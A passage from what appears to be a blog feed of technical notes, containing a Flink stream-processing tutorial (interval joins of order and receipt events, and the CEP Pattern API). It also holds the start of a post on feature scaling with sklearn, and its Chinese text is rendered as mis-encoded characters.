class="string">&quot;,&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ReceiptEvent(fields[<span class="number">0</span>], fields[<span class="number">1</span>], <span class="keyword">new</span> Long(fields[<span class="number">2</span>]));</span><br><span class="line">      &#125;)</span><br><span class="line">      .assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">        <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;ReceiptEvent&gt;(Time.of(<span class="number">200</span>, TimeUnit.MILLISECONDS)) &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(ReceiptEvent element)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åŒºé—´è¿æ¥ä¸¤æ¡æµï¼Œå¾—åˆ°åŒ¹é…çš„æ•°æ®</span></span><br><span class="line">    SingleOutputStreamOperator&lt;Tuple2&lt;OrderEvent, ReceiptEvent&gt;&gt; resultStream = orderEventStream</span><br><span class="line">      .keyBy(OrderEvent::getTxId)</span><br><span class="line">      .intervalJoin(receiptEventStream.keyBy(ReceiptEvent::getTxId))</span><br><span class="line">      .between(Time.seconds(-<span class="number">3</span>), Time.seconds(<span class="number">5</span>))    <span class="comment">// -3ï¼Œ5 åŒºé—´èŒƒå›´</span></span><br><span class="line">      .process(<span class="keyword">new</span> TxPayMatchDetectByJoin());</span><br><span class="line"></span><br><span class="line">    resultStream.print();</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;tx pay match by join job&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å®ç°è‡ªå®šä¹‰ProcessJoinFunction</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">TxPayMatchDetectByJoin</span> <span class="keyword">extends</span> <span class="title">ProcessJoinFunction</span>&lt;<span class="title">OrderEvent</span>, <span class="title">ReceiptEvent</span>, <span class="title">Tuple2</span>&lt;<span class="title">OrderEvent</span>, <span class="title">ReceiptEvent</span>&gt;&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(OrderEvent left, ReceiptEvent right, Context ctx, Collector&lt;Tuple2&lt;OrderEvent, ReceiptEvent&gt;&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      out.collect(<span class="keyword">new</span> Tuple2&lt;&gt;(left, right));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> è¾“å‡º  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(OrderEvent&#123;orderId=34729, eventType=&#x27;pay&#x27;, txId=&#x27;sd76f87d6&#x27;, timestamp=1558430844&#125;,ReceiptEvent&#123;txId=&#x27;sd76f87d6&#x27;, payChannel=&#x27;wechat&#x27;, timestamp=1558430847&#125;)</span><br><span class="line">(OrderEvent&#123;orderId=34730, eventType=&#x27;pay&#x27;, txId=&#x27;3hu3k2432&#x27;, timestamp=1558430845&#125;,ReceiptEvent&#123;txId=&#x27;3hu3k2432&#x27;, payChannel=&#x27;alipay&#x27;, timestamp=1558430848&#125;)</span><br><span class="line">(OrderEvent&#123;orderId=34746, eventType=&#x27;pay&#x27;, txId=&#x27;3243hr9h9&#x27;, timestamp=1558430895&#125;,ReceiptEvent&#123;txId=&#x27;3243hr9h9&#x27;, payChannel=&#x27;wechat&#x27;, timestamp=1558430892&#125;)</span><br><span class="line">(OrderEvent&#123;orderId=34747, eventType=&#x27;pay&#x27;, txId=&#x27;329d09f9f&#x27;, timestamp=1558430893&#125;,ReceiptEvent&#123;txId=&#x27;329d09f9f&#x27;, payChannel=&#x27;alipay&#x27;, timestamp=1558430893&#125;)</span><br></pre></td></tr></table></figure></li></ul><h3 id="CEP"><a href="#CEP" class="headerlink" title="CEP"></a>CEP</h3><blockquote><p><a href="https://zhuanlan.zhihu.com/p/43448829">Flink-å¤æ‚äº‹ä»¶ï¼ˆCEPï¼‰</a></p><p><a href="https://blog.csdn.net/qq_37135484/article/details/106327567">Flinkä¹‹CEP(å¤æ‚æ—¶é—´å¤„ç†)</a></p></blockquote><h4 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h4><h5 id="ä»€ä¹ˆæ˜¯CEP"><a href="#ä»€ä¹ˆæ˜¯CEP" class="headerlink" title="ä»€ä¹ˆæ˜¯CEP"></a>ä»€ä¹ˆæ˜¯CEP</h5><ul><li> å¤æ‚äº‹ä»¶å¤„ç†ï¼ˆComplex Event Processingï¼ŒCEPï¼‰ </li><li> Flink CEPæ˜¯åœ¨Flinkä¸­å®ç°çš„å¤æ‚äº‹ä»¶å¤„ç†ï¼ˆCEPï¼‰åº“ </li><li> CEPå…è®¸åœ¨<strong>æ— ä¼‘æ­¢çš„äº‹ä»¶æµ</strong>ä¸­æ£€æµ‹äº‹ä»¶æ¨¡å¼ï¼Œè®©æˆ‘ä»¬æœ‰æœºä¼šæŒæ¡æ•°æ®ä¸­é‡è¦çš„éƒ¨åˆ† </li><li> <strong>ä¸€ä¸ªæˆ–å¤šä¸ªç”±ç®€å•äº‹ä»¶æ„æˆçš„äº‹ä»¶æµé€šè¿‡ä¸€å®šçš„è§„åˆ™åŒ¹é…ï¼Œç„¶åè¾“å‡ºç”¨æˆ·æƒ³å¾—åˆ°çš„æ•°æ®â€”â€”æ»¡è¶³è§„åˆ™çš„å¤æ‚äº‹ä»¶</strong> </li></ul><h5 id="CEPç‰¹ç‚¹"><a href="#CEPç‰¹ç‚¹" class="headerlink" title="CEPç‰¹ç‚¹"></a>CEPç‰¹ç‚¹</h5><p><img src="https://pic1.zhimg.com/80/v2-1c7057bda8a3ba077a3b8059f35d9bc4_1440w.jpg###id=O7Ztz&originHeight=441&originWidth=942&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>ç›®æ ‡ï¼šä»æœ‰åºçš„ç®€å•äº‹ä»¶æµä¸­å‘ç°ä¸€äº›é«˜é˜¶ç‰¹å¾</li></ul><ul><li> è¾“å…¥ï¼šä¸€ä¸ªæˆ–å¤šä¸ªç”±ç®€å•äº‹ä»¶æ„æˆçš„äº‹ä»¶æµ </li><li> å¤„ç†ï¼šè¯†åˆ«ç®€å•äº‹ä»¶ä¹‹é—´çš„å†…åœ¨è”ç³»ï¼Œå¤šä¸ªç¬¦åˆä¸€å®šè§„åˆ™çš„ç®€å•äº‹ä»¶æ„æˆå¤æ‚äº‹ä»¶ </li><li> è¾“å‡ºï¼šæ»¡è¶³è§„åˆ™çš„å¤æ‚äº‹ä»¶ </li></ul><h4 id="Pattern-API"><a href="#Pattern-API" class="headerlink" title="Pattern API"></a>Pattern API</h4><ul><li> å¤„ç†äº‹ä»¶çš„è§„åˆ™ï¼Œè¢«å«åšâ€æ¨¡å¼â€ï¼ˆPatternï¼‰ </li><li> Flink CEPæä¾›äº†Pattern APIï¼Œç”¨äºå¯¹è¾“å…¥æµæ•°æ®è¿›è¡Œå¤æ‚äº‹ä»¶è§„åˆ™å®šä¹‰ï¼Œç”¨æ¥æå–ç¬¦åˆè§„åˆ™çš„æ—¶é—´åºåˆ—  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">DataStream&lt;Event&gt; input = ...</span><br><span class="line"><span class="comment">// å®šä¹‰ä¸€ä¸ªPattern</span></span><br><span class="line">Pattern&lt;Event, Event&gt; pattern = Pattern.&lt;Event&gt;begin(<span class="string">&quot;start&quot;</span>).where(...)</span><br><span class="line">  .next(<span class="string">&quot;middle&quot;</span>).subtype(SubEvent.class).where(...)</span><br><span class="line">  .followedBy(<span class="string">&quot;end&quot;</span>).where(...);</span><br><span class="line"><span class="comment">// å°†åˆ›å»ºå¥½çš„Patternåº”ç”¨åˆ°è¾“å…¥äº‹ä»¶æµä¸Š</span></span><br><span class="line">PatternStream&lt;Event&gt; patternStream = CEP.pattern(input,pattern);</span><br><span class="line"><span class="comment">// æ£€å‡ºåŒ¹é…äº‹ä»¶åºåˆ—ï¼Œå¤„ç†å¾—åˆ°ç»“æœ</span></span><br><span class="line">DataStream&lt;Alert&gt; result = patternStream.select(...);</span><br></pre></td></tr></table></figure></li></ul><h5 id="ä¸ªä½“æ¨¡å¼-Individual-Patterns"><a href="#ä¸ªä½“æ¨¡å¼-Individual-Patterns" class="headerlink" title="ä¸ªä½“æ¨¡å¼(Individual Patterns)"></a>ä¸ªä½“æ¨¡å¼(Individual Patterns)</h5><ul><li><p> ç»„æˆå¤æ‚è§„åˆ™çš„æ¯ä¸€ä¸ªå•ç‹¬çš„æ¨¡å¼å®šä¹‰,å°±æ˜¯â€ä¸ªä½“æ¨¡å¼â€  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start.times(<span class="number">3</span>).where(<span class="keyword">new</span> SimpleCondition&lt;Event&gt;() &#123;...&#125;)</span><br></pre></td></tr></table></figure></li><li><p> ä¸ªä½“æ¨¡å¼å¯ä»¥åŒ…æ‹¬â€å•ä¾‹(singleton)æ¨¡å¼â€å’Œâ€å¾ªç¯(looping)æ¨¡å¼â€ </p></li><li><p> å•ä¾‹æ¨¡å¼åªæ¥æ”¶ä¸€ä¸ªäº‹ä»¶ï¼Œè€Œå¾ªç¯æ¨¡å¼å¯ä»¥æ¥æ”¶å¤šä¸ª </p></li></ul><hr><ul><li><p> é‡è¯ï¼ˆQuantifierï¼‰<br>å¯ä»¥åœ¨ä¸€ä¸ªä¸ªä½“æ¨¡å¼åè¿½åŠ é‡è¯ï¼Œä¹Ÿå°±æ˜¯æŒ‡å®šå¾ªç¯æ¬¡æ•°  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åŒ¹é…å‡ºç°4æ¬¡</span></span><br><span class="line">start.times(<span class="number">4</span>)</span><br><span class="line"><span class="comment">//åŒ¹é…å‡ºç°2/3/4æ¬¡</span></span><br><span class="line">start.time(<span class="number">2</span>,<span class="number">4</span>).greedy</span><br><span class="line"><span class="comment">//åŒ¹é…å‡ºç°0æˆ–è€…4æ¬¡</span></span><br><span class="line">start.times(<span class="number">4</span>).optional</span><br><span class="line"><span class="comment">//åŒ¹é…å‡ºç°1æ¬¡æˆ–è€…å¤šæ¬¡</span></span><br><span class="line">start.oneOrMore</span><br><span class="line"><span class="comment">//åŒ¹é…å‡ºç°2,3,4æ¬¡</span></span><br><span class="line">start.times(<span class="number">2</span>,<span class="number">4</span>)</span><br><span class="line"><span class="comment">//åŒ¹é…å‡ºç°0æ¬¡,2æ¬¡æˆ–è€…å¤šæ¬¡,å¹¶ä¸”å°½å¯èƒ½å¤šçš„é‡å¤åŒ¹é…</span></span><br><span class="line">start.timesOrMore(<span class="number">2</span>),optional.greedy</span><br></pre></td></tr></table></figure></li><li><p>æ¡ä»¶ï¼ˆConditionï¼‰ </p><ul><li><p> <strong>æ¯ä¸ªæ¨¡å¼éƒ½éœ€è¦æŒ‡å®šè§¦å‘æ¡ä»¶</strong>ï¼Œä½œä¸ºæ¨¡å¼æ˜¯å¦æ¥å—äº‹ä»¶è¿›å…¥çš„åˆ¤æ–­ä¾æ® </p></li><li><p> CEPä¸­çš„ä¸ªä½“æ¨¡å¼ä¸»è¦é€šè¿‡è°ƒç”¨<code>.where()</code>ï¼Œ<code>.or()</code>å’Œ<code>.until()</code>æ¥æŒ‡å®šæ¡ä»¶ </p></li><li><p>æŒ‰ä¸åŒçš„è°ƒç”¨æ–¹å¼ï¼Œå¯ä»¥åˆ†æˆä»¥ä¸‹å‡ ç±» </p><ul><li><p> ç®€å•æ¡ä»¶ï¼ˆSimple Conditionï¼‰<br>é€šè¿‡<code>.where()</code>æ–¹æ³•å¯¹äº‹ä»¶ä¸­çš„å­—æ®µè¿›è¡Œåˆ¤æ–­ç­›é€‰ï¼Œå†³å®šæ˜¯å¦æ¥å—è¯¥äº‹ä»¶  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">start.where(<span class="keyword">new</span> SimpleCondition&lt;Event&gt;)&#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">filter</span><span class="params">(Event value)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> value.getName.startsWith(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> ç»„åˆæ¡ä»¶ï¼ˆCombining Conditionï¼‰<br>å°†ç®€å•æ¡ä»¶è¿›è¡Œåˆå¹¶ï¼›<code>.or()</code>æ–¹æ³•è¡¨ç¤ºæˆ–é€»è¾‘ç›¸è¿ï¼Œwhereçš„ç›´æ¥ç»„åˆå°±æ˜¯AND<br><code>pattern.where(event =&gt; ... /* some condition */).or(event =&gt; ... /* or condition */)</code> </p></li><li><p> ç»ˆæ­¢æ¡ä»¶ï¼ˆStop Conditionï¼‰<br>å¦‚æœä½¿ç”¨äº†<code>oneOrMore</code>æˆ–è€…<code>oneOrMore.optional</code>ï¼Œå»ºè®®ä½¿ç”¨<code>.until()</code>ä½œä¸ºç»ˆæ­¢æ¡ä»¶ï¼Œä»¥ä¾¿æ¸…ç†çŠ¶æ€ </p></li><li><p> è¿­ä»£æ¡ä»¶ï¼ˆIterative Conditionï¼‰<br>èƒ½å¤Ÿå¯¹æ¨¡å¼ä¹‹å‰æ‰€æœ‰æ¥æ”¶çš„äº‹ä»¶è¿›è¡Œå¤„ç†<br>å¯ä»¥è°ƒç”¨<code>ctx.getEventsForPattern(&quot;name&quot;)</code>  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.where(<span class="keyword">new</span> IterativeCondition&lt;Event&gt;()&#123;...&#125;)</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><h5 id="ç»„åˆæ¨¡å¼-Combining-Patterns"><a href="#ç»„åˆæ¨¡å¼-Combining-Patterns" class="headerlink" title="ç»„åˆæ¨¡å¼(Combining Patterns)"></a>ç»„åˆæ¨¡å¼(Combining Patterns)</h5><p>ç»„åˆæ¨¡å¼(Combining Patterns)ä¹Ÿå«æ¨¡å¼åºåˆ—ã€‚</p><ul><li> å¾ˆå¤šä¸ªä½“æ¨¡å¼ç»„åˆèµ·æ¥ï¼Œå°±å½¢æˆäº†æ•´ä¸ªçš„æ¨¡å¼åºåˆ— </li><li> æ¨¡å¼åºåˆ—å¿…é¡»ä»¥ä¸€ä¸ªâ€åˆå§‹æ¨¡å¼â€å¼€å§‹  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pattern&lt;Event, Event&gt; start = Pattern.&lt;Event&gt;begin(<span class="string">&quot;start&quot;</span>)</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://img-blog.csdnimg.cn/20200526221919332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MTM1NDg0,size_16,color_FFFFFF,t_70###id=o5YAt&originHeight=472&originWidth=559&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>ä¸¥æ ¼è¿‘é‚»(Strict Contiguity) <ul><li><strong>æ‰€æœ‰äº‹ä»¶æŒ‰ç…§ä¸¥æ ¼çš„é¡ºåºå‡ºç°</strong>ï¼Œä¸­é—´æ²¡æœ‰ä»»ä½•ä¸åŒ¹é…çš„äº‹ä»¶ï¼Œç”±<code>.next()</code>æŒ‡å®š</li><li>ä¾‹å¦‚å¯¹äºæ¨¡å¼â€a next bâ€,äº‹ä»¶åºåˆ—[a,c,b1,b2]æ²¡æœ‰åŒ¹é…</li></ul></li><li>å®½æ¾è¿‘é‚»(Relaxed Contiguity) <ul><li>å…è®¸ä¸­é—´å‡ºç°ä¸åŒ¹é…çš„äº‹ä»¶,ç”±<code>.followedBy()</code>æŒ‡å®š</li><li>ä¾‹å¦‚å¯¹äºæ¨¡å¼â€a followedBy bâ€,äº‹ä»¶åºåˆ—[a,c,b1,b2]åŒ¹é…ä¸º[a,b1]</li></ul></li><li>éç¡®å®šæ€§å®½æ¾è¿‘é‚»(Non-Deterministic Relaxed Contiguity) <ul><li>è¿›ä¸€æ­¥æ”¾å®½æ¡ä»¶,ä¹‹å‰å·²ç»åŒ¹é…è¿‡çš„äº‹ä»¶ä¹Ÿå¯ä»¥å†æ¬¡ä½¿ç”¨ï¼Œç”±<code>.followByAny()</code>æŒ‡å®š</li><li>ä¾‹å¦‚å¯¹äºæ¨¡å¼â€a followedAny bâ€,äº‹ä»¶åºåˆ—[a,c,b1,b2]åŒ¹é…ä¸º{a,b1},{a,b2}</li></ul></li><li>é™¤äº†ä»¥ä¸Šæ¨¡å¼åºåˆ—å¤–,è¿˜å¯ä»¥å®šä¹‰â€ä¸å¸Œæœ›å‡ºç°æŸç§è¿‘é‚»å…³ç³»â€: <ul><li> <code>.notNext()</code> ä¸ä¸¥æ ¼è¿‘é‚» </li><li> <code>.notFollowedBy()</code>ä¸åœ¨ä¸¤ä¸ªäº‹ä»¶ä¹‹é—´å‘ç”Ÿ<br>ï¼ˆegï¼Œa not FollowedBy cï¼Œa Followed By bï¼Œaå¸Œæœ›ä¹‹åå‡ºç°bï¼Œä¸”ä¸å¸Œæœ›abä¹‹é—´å‡ºç°cï¼‰ </li></ul></li><li>éœ€è¦æ³¨æ„ï¼š <ul><li> <strong>æ‰€æœ‰æ¨¡å¼åºåˆ—å¿…é¡»ä»¥</strong><code>**.begin()**</code><strong>å¼€å§‹</strong> </li><li> <strong>æ¨¡å¼åºåˆ—ä¸èƒ½ä»¥</strong><code>**.notFollowedBy()**</code><strong>ç»“æŸ</strong> </li><li> <strong>â€œnot â€œç±»å‹çš„æ¨¡å¼ä¸èƒ½è¢«optional æ‰€ä¿®é¥°</strong> </li><li> æ­¤å¤–,è¿˜å¯ä»¥ä¸ºæ¨¡å¼æŒ‡å®šäº‹ä»¶çº¦æŸï¼Œç”¨æ¥è¦æ±‚åœ¨å¤šé•¿æ—¶é—´å†…åŒ¹é…æœ‰æ•ˆ: </li></ul></li></ul><p><code>next.within(Time.seconds(10))</code></p><h5 id="æ¨¡å¼ç»„-Groups-of-patterns"><a href="#æ¨¡å¼ç»„-Groups-of-patterns" class="headerlink" title="æ¨¡å¼ç»„(Groups of patterns)"></a>æ¨¡å¼ç»„(Groups of patterns)</h5><ul><li>å°†ä¸€ä¸ªæ¨¡å¼åºåˆ—ä½œä¸ºæ¡ä»¶åµŒå¥—åœ¨ä¸ªä½“æ¨¡å¼é‡Œï¼Œæˆä¸ºä¸€ç»„æ¨¡å¼</li></ul><h4 id="æ¨¡å¼çš„æ£€æµ‹"><a href="#æ¨¡å¼çš„æ£€æµ‹" class="headerlink" title="æ¨¡å¼çš„æ£€æµ‹"></a>æ¨¡å¼çš„æ£€æµ‹</h4><ul><li> æŒ‡å®šè¦æŸ¥æ‰¾çš„æ¨¡å¼åºåˆ—åï¼Œå°±å¯ä»¥å°†å…¶åº”ç”¨äºè¾“å…¥æµä»¥æ£€æµ‹æ½œåœ¨åŒ¹é… </li><li> è°ƒç”¨<code>CEP.pattern()</code>ï¼Œç»™å®šè¾“å…¥æµå’Œæ¨¡å¼ï¼Œå°±èƒ½å¾—åˆ°ä¸€ä¸ªPatternStream  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DataStream&lt;Event&gt; input = ...</span><br><span class="line">Pattern&lt;Event, Event&gt; pattern = Pattern.&lt;Event&gt;begin(<span class="string">&quot;start&quot;</span>).where(...)...</span><br><span class="line"></span><br><span class="line">PatternStream&lt;Event&gt; patternStream = CEP.pattern(input, pattern);</span><br></pre></td></tr></table></figure></li></ul><h4 id="åŒ¹é…äº‹ä»¶çš„æå–"><a href="#åŒ¹é…äº‹ä»¶çš„æå–" class="headerlink" title="åŒ¹é…äº‹ä»¶çš„æå–"></a>åŒ¹é…äº‹ä»¶çš„æå–</h4><ul><li> åˆ›å»ºPatternStreanä¹‹åï¼Œå°±å¯ä»¥åº”ç”¨selectæˆ–è€…flatselectæ–¹æ³•ï¼Œä»æ£€æµ‹åˆ°çš„äº‹ä»¶åºåˆ—ä¸­æå–äº‹ä»¶äº† </li><li> <code>select()</code>æ–¹æ³•éœ€è¦è¾“å…¥ä¸€ä¸ªselect functionä½œä¸ºå‚æ•°,æ¯ä¸ªæˆåŠŸåŒ¹é…çš„äº‹ä»¶åºåˆ—éƒ½ä¼šè°ƒç”¨å®ƒ </li><li> <code>select()</code> ä»¥ä¸€ä¸ªMap&lt;Stringï¼ŒList&lt;IN]&gt;&gt; æ¥æ¥æ”¶åŒ¹é…åˆ°çš„äº‹ä»¶åºåˆ—ï¼Œå…¶ä¸­Keyå°±æ˜¯æ¯ä¸ªæ¨¡å¼çš„åç§°ï¼Œè€Œvalueå°±æ˜¯æ‰€æœ‰æ¥æ”¶åˆ°çš„äº‹ä»¶çš„Listç±»å‹  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> OUT <span class="title">select</span><span class="params">(Map&lt;String, List&lt;IN&gt;&gt; pattern)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">  IN startEvent = pattern.get(<span class="string">&quot;start&quot;</span>).get(<span class="number">0</span>);</span><br><span class="line">  IN endEvent = pattern.get(<span class="string">&quot;end&quot;</span>).get(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> OUT(startEvent, endEvent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="è¶…æ—¶äº‹ä»¶çš„æå–"><a href="#è¶…æ—¶äº‹ä»¶çš„æå–" class="headerlink" title="è¶…æ—¶äº‹ä»¶çš„æå–"></a>è¶…æ—¶äº‹ä»¶çš„æå–</h4><ul><li> <strong>å½“ä¸€ä¸ªæ¨¡å¼é€šè¿‡withinå…³é”®å­—å®šä¹‰äº†æ£€æµ‹çª—å£æ—¶é—´æ—¶ï¼Œéƒ¨åˆ†äº‹ä»¶åºåˆ—å¯èƒ½å› ä¸ºè¶…è¿‡çª—å£é•¿åº¦è€Œè¢«ä¸¢å¼ƒï¼›ä¸ºäº†èƒ½å¤Ÿå¤„ç†è¿™äº›è¶…æ—¶çš„éƒ¨åˆ†åŒ¹é…ï¼Œselectå’ŒflatSelect APIè°ƒç”¨å…è®¸æŒ‡å®šè¶…æ—¶å¤„ç†ç¨‹åº</strong> </li><li> <strong>è¶…æ—¶å¤„ç†ç¨‹åºä¼šæ¥æ”¶åˆ°ç›®å‰ä¸ºæ­¢ç”±æ¨¡å¼åŒ¹é…åˆ°çš„æ‰€æœ‰äº‹ä»¶ï¼Œç”±ä¸€ä¸ªOutputTagå®šä¹‰æ¥æ”¶åˆ°çš„è¶…æ—¶äº‹ä»¶åºåˆ—</strong>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PatternStream&lt;Event&gt; patternStream = CEP.pattern(input, pattern);</span><br><span class="line">OutputTag&lt;String&gt; outputTag = <span class="keyword">new</span> OutputTag&lt;String&gt;(<span class="string">&quot;side-output&quot;</span>)&#123;&#125;;</span><br><span class="line"></span><br><span class="line">SingleOutputStreamOperator&lt;ComplexEvent&gt; flatResult = </span><br><span class="line">  patternStream.flatSelect(</span><br><span class="line">  outputTag,</span><br><span class="line">  <span class="keyword">new</span> PatternFlatTimeoutFunction&lt;Event, TimeoutEvent&gt;() &#123;...&#125;,</span><br><span class="line">  <span class="keyword">new</span> PatternFlatSelectFunction&lt;Event, ComplexEvent&gt;() &#123;...&#125;</span><br><span class="line">);</span><br><span class="line">DataStream&lt;TimeoutEvent&gt; timeoutFlatResult = </span><br><span class="line">  flatResult.getSideOutput(outputTag);</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> BigData </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flink </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä»€ä¹ˆæ˜¯æ•°æ®æ ‡å‡†åŒ–</title>
      <link href="/2021/08/13/%E4%BB%80%E4%B9%88%E6%98%AF%E6%95%B0%E6%8D%AE%E6%A0%87%E5%87%86%E5%8C%96/"/>
      <url>/2021/08/13/%E4%BB%80%E4%B9%88%E6%98%AF%E6%95%B0%E6%8D%AE%E6%A0%87%E5%87%86%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="å®šä¹‰"><a href="#å®šä¹‰" class="headerlink" title="å®šä¹‰"></a>å®šä¹‰</h2><p>é€šå¸¸æ¥è¯´ï¼Œå®ƒä»¬éƒ½æ˜¯æŒ‡ç‰¹å¾å·¥ç¨‹ä¸­çš„ç‰¹å¾ç¼©æ”¾è¿‡ç¨‹ï¼Œç”±äºä¸­æ–‡ç¿»è¯‘çš„åŸå› ï¼Œç½‘ä¸Šå¯¹å®ƒä»¬çš„è§£é‡Šä¹Ÿæ˜¯äº”èŠ±å…«é—¨ï¼Œä½†å…¶å®æˆ‘ä»¬ä¸è€ƒè™‘å®ƒä»¬çš„åå­—ï¼Œç›´æ¥çœ‹å®ƒä»¬çš„ä½œç”¨å’Œæ“ä½œæ–¹æ³•ï¼Œå¯èƒ½ä¼šæ›´å®¹æ˜“ç†è§£ã€‚<br>ä½¿ç”¨ç‰¹å¾ç¼©æ”¾çš„ä½œç”¨æ˜¯ï¼š</p><ol><li>ä½¿ä¸åŒé‡çº²çš„ç‰¹å¾å¤„äºåŒä¸€æ•°å€¼é‡çº§ï¼Œå‡å°‘æ–¹å·®å¤§çš„ç‰¹å¾çš„å½±å“ï¼Œä½¿æ¨¡å‹æ›´å‡†ç¡®ã€‚</li><li>åŠ å¿«å­¦ä¹ ç®—æ³•çš„æ”¶æ•›é€Ÿåº¦ã€‚</li></ol><p>å‚è€ƒsklearnçš„å®˜æ–¹æ–‡æ¡£çš„æ•°æ®é¢„å¤„ç†ç« èŠ‚ï¼Œ<br><a href="https://link.zhihu.com/?target=https://scikit-learn.org/stable/modules/preprocessing.html">5.3. Preprocessing datascikit-learn.org/stable/modules/preprocessing.html</a><br>ç¼©æ”¾è¿‡ç¨‹å¯ä»¥åˆ†ä¸ºä»¥ä¸‹å‡ ç§ï¼š</p><ol><li>ç¼©æ”¾åˆ°å‡å€¼ä¸º0ï¼Œæ–¹å·®ä¸º1ï¼ˆ<strong>Standardizationâ€”â€”</strong>StandardScaler()ï¼‰</li><li>ç¼©æ”¾åˆ°0å’Œ1ä¹‹é—´ï¼ˆ<strong>Standardizationâ€”â€”</strong>MinMaxScaler()ï¼‰</li><li>ç¼©æ”¾åˆ°-1å’Œ1ä¹‹é—´ï¼ˆ<strong>Standardizationâ€”â€”</strong>MaxAbsScaler()ï¼‰</li><li>ç¼©æ”¾åˆ°0å’Œ1ä¹‹é—´ï¼Œä¿ç•™åŸå§‹æ•°æ®çš„åˆ†å¸ƒï¼ˆ<strong>Normalizationâ€”â€”</strong>Normalizer()ï¼‰</li></ol><p>1å°±æ˜¯å¸¸è¯´çš„z-scoreå½’ä¸€åŒ–ï¼Œ2æ˜¯min-maxå½’ä¸€åŒ–ã€‚<br>ä¸¾ä¸ªä¾‹å­æ¥çœ‹çœ‹å®ƒä»¬ä¹‹é—´çš„åŒºåˆ«ï¼Œå‡è®¾ä¸€ä¸ªæ•°æ®é›†åŒ…æ‹¬ã€Œèº«é«˜ã€å’Œã€Œä½“é‡ã€ä¸¤ä¸ªç‰¹å¾ï¼Œå®ƒä»¬éƒ½æ»¡è¶³æ­£æ€åˆ†å¸ƒï¼Œç”»å‡ºåŸå§‹æ•°æ®å›¾åƒä¸ºï¼š<br><img 